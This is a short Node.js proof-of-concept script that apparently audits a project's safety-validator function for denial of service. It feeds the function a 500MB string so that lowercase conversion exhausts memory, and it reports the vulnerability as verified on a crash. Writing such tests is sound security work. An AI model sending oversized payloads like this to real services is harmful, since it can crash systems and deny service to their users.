
import { classifyRequest } from '../../dist/src/validator/safety-validator.js';
import { performance } from 'perf_hooks';

console.log('Starting Input Validation DoS PoC...');

// Attempt to allocate a string that stresses the limits
// V8 (Node) max string length is approx 512MB - 1GB depending on version.
// We will try 500MB.
const size = 1024 * 1024 * 500; // 500MB
let payload = '';

try {
    console.log(`Allocating ${size / (1024 * 1024)} MB string...`);
    payload = ' '.repeat(size) + 'valid_request_text';
} catch (e) {
    console.log('Failed to allocate payload (System protected by V8 limit).');
    process.exit(0);
}

try {
    const start = performance.now();
    console.log('Calling classifyRequest...');
    // This will call .toLowerCase() which attempts to allocate ANOTHER 500MB string.
    // If heap is ~1GB, this might crash.
    classifyRequest(payload);
    const end = performance.now();
    console.log(`Execution finished in ${(end - start).toFixed(2)}ms`);
} catch (error) {
    console.error('CRASHED / Error:', error.message);
    console.log('Vulnerability Verified: Unbounded Input caused crash.');
}
